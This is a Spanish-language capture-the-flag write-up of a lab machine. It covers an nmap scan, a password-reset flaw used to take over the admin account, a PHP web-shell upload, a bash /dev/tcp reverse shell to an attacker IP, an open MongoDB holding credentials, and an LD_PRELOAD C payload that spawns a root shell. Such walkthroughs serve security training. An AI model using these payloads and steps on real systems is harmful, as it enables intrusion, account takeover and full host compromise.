### Tags: `mongo` `LD_PRELOAD` 

# Escaneo (*22,80*)

```css
 sudo nmap -p- 172.17.0.2 -sSVC --min-rate 5000 -n -Pn --open -oN escaneo.txt
```
![image](https://github.com/user-attachments/assets/6c99e2d1-7caf-4280-83fb-8b982c975dec)

# Web port80
En la web tenemos un *dominio* `skycouriers.thm` que vamos a agregar al `/etc/hosts`

![image](https://github.com/user-attachments/assets/08970ac0-b2dd-446f-8098-3244663376ea)

 Investigando el web encontramos un *panel de login*

 ![image](https://github.com/user-attachments/assets/a90be2c6-b5dc-4195-8d02-3d5bcf75c500)

Como no encontramos nada lo que vamos a hacer es registrarnos como `test@test.com:test123` 

![image](https://github.com/user-attachments/assets/3a139dd0-a9e1-4ba3-8758-aa4eb7c8da11)

Tuvimos éxito y estamos dentro

![image](https://github.com/user-attachments/assets/6b5a885f-791f-4f23-bc09-ac4ee125cd06)

## Explotación
Vemos esto que solo `admin@sky.thm` tiene acceso

![image](https://github.com/user-attachments/assets/5a88c32d-c67f-4ea1-a217-54c161ef67de)

Tambien encontramos esto otro para cambiar la contraseña sin tener que poner la de antes, curioso

![image](https://github.com/user-attachments/assets/c89d7588-67c9-4029-a45a-012d0eb7117d)

### BurpSuite
Con BurpSuite interceptamos la **petición** para ver que onda

![image](https://github.com/user-attachments/assets/f6953ed4-370d-4b15-85a9-6d2b7fd8dea9)

Lo que vamos a hacer es modificar la contraseña de ``admin@sky.thm`` y le damos a `forward` y listo

![image](https://github.com/user-attachments/assets/e5eb4091-7a00-4a7e-ad96-2a80d4c3ce6c)

 Estamos dentro como `admin`

 ![image](https://github.com/user-attachments/assets/f9d225ae-1222-404c-b217-c73e173b231f)

# Dentro (**admin**)
Ahora para darnos una acceder a la máquina lo tenemos que hacer por acá ya que ahora si podemos (porque somos admin)

![image](https://github.com/user-attachments/assets/1d9b4de1-38d2-48c3-95c8-5ec885bd64e0)

Vemos que los archivos se suben a `/v2/profileimages/..`

![image](https://github.com/user-attachments/assets/65d367eb-8a21-4e91-8cda-b359f4eaa1d6)

Por ende subimos este archivo ``shell.php``  que creamos en nuestra máquina

```css
<?php
        system($_GET['cmd']);
?>
```
![image](https://github.com/user-attachments/assets/0b73dfa3-ca37-4bcc-be1f-37488f5f5354)

Vemos que funcionó

![image](https://github.com/user-attachments/assets/0ffe33d3-3103-4e1e-b657-88faf017b6b3)

Ahora nos mandamos un ReverseShell  `bash -c "bash -i >%26 /dev/tcp/10.2.1.196/443 0>%261"`. (antes `nc -nlvp 443`)

![image](https://github.com/user-attachments/assets/a98d0ae0-fec3-49f8-8fd1-6f047c3c3836)
![image](https://github.com/user-attachments/assets/ec92631b-2777-4fab-a74d-65c32f233194)

# Escalada (**webdeveloper**)
Con este comando `ss -ntulp`   enumero puertos internos  y vemos que en este puerto corre **MONGO**

![image](https://github.com/user-attachments/assets/890ff98b-facd-4029-a123-281914575d25)

Tratamos de conectarnos *sin proporcionar contraseña* y tuvimos éxito, ejecutando `mongo`en la terminal

![image](https://github.com/user-attachments/assets/85330a15-53a8-4aff-acfc-1690496283b4)

Listamos las bases de datos disponibles con `show dbs`, `use backup` para acceder, `show collections;` para listar las tabas y por ultimo `db.user.find();` para leer el contenido de la tabla.

![image](https://github.com/user-attachments/assets/7017e1d9-cdf6-44c7-82cc-65385b5c8326)

Vemos que el usuario existe 

![image](https://github.com/user-attachments/assets/d6130683-9a62-49bc-95b8-6c95f3f4812d)

Por ende *introducimos* su contraseña y estamos dentro

![image](https://github.com/user-attachments/assets/ac81a2d1-4ac2-422e-a0ca-200719de1ffb)

## Ecalada ROOT

 Haciendo `sudo -l` vemos esto:

 ![image](https://github.com/user-attachments/assets/60142a56-e40c-46aa-90af-60b439ed6fc4)

``LD_PRELOAD`` es una función que permite a cualquier programa utilizar bibliotecas compartidas.
Buscando en Google como escalar privilegios, encontramos este en en [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path), seguimos los pasos que dice ahí.
Codigo:

```cs
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Por mas que de ese error cuando compilamos funciona igual y somos ¡``root``!

![image](https://github.com/user-attachments/assets/1738ee65-707a-4fe7-bcfe-d3dc33b66db7)













